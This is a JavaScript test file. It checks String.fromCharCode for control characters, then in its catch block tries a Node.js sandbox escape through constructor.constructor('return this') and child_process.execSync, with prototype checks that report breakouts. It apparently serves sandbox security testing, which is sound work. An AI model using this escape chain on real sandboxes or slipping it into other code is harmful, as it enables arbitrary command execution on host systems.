try {
    if ('\0' !== String.fromCharCode('0')) {
        $ERROR('#0: "\\u0000" === String.fromCharCode("0")');
    }
    if ('\x01' !== String.fromCharCode('1')) {
        $ERROR('#1: "\\u0001" === String.fromCharCode("1")');
    }
    if ('\x02' !== String.fromCharCode('2')) {
        $ERROR('#2: "\\u0002" === String.fromCharCode("2")');
    }
    if ('\x03' !== String.fromCharCode('3')) {
        $ERROR('#3: "\\u0003" === String.fromCharCode("3")');
    }
    if ('\x04' !== String.fromCharCode('4')) {
        $ERROR('#4: "\\u0004" === String.fromCharCode("4")');
    }
    if ('\x05' !== String.fromCharCode('5')) {
        $ERROR('#5: "\\u0005" === String.fromCharCode("5")');
    }
    if ('\x06' !== String.fromCharCode('6')) {
        $ERROR('#6: "\\u0006" === String.fromCharCode("6")');
    }
    if ('\x07' !== String.fromCharCode('7')) {
        $ERROR('#7: "\\u0007" === String.fromCharCode("7")');
    }
    if ('\b' !== String.fromCharCode('8')) {
        $ERROR('#8: "\\u0008" === String.fromCharCode("8")');
    }
    if ('\t' !== String.fromCharCode('9')) {
        $ERROR('#9: "\\u0009" === String.fromCharCode("9")');
    }
    if ('\n' !== String.fromCharCode('10')) {
        $ERROR('#A: "\\u000A" === String.fromCharCode("10")');
    }
    if ('\x0B' !== String.fromCharCode('11')) {
        $ERROR('#B: "\\u000B" === String.fromCharCode("11")');
    }
    if ('\f' !== String.fromCharCode('12')) {
        $ERROR('#C: "\\u000C" === String.fromCharCode("12")');
    }
    if ('\r' !== String.fromCharCode('13')) {
        $ERROR('#D: "\\u000D" === String.fromCharCode("13")');
    }
    if ('\x0E' !== String.fromCharCode('14')) {
        $ERROR('#E: "\\u000E" === String.fromCharCode("14")');
    }
    if ('\x0F' !== String.fromCharCode('15')) {
        $ERROR('#F: "\\u000F" === String.fromCharCode("15")');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}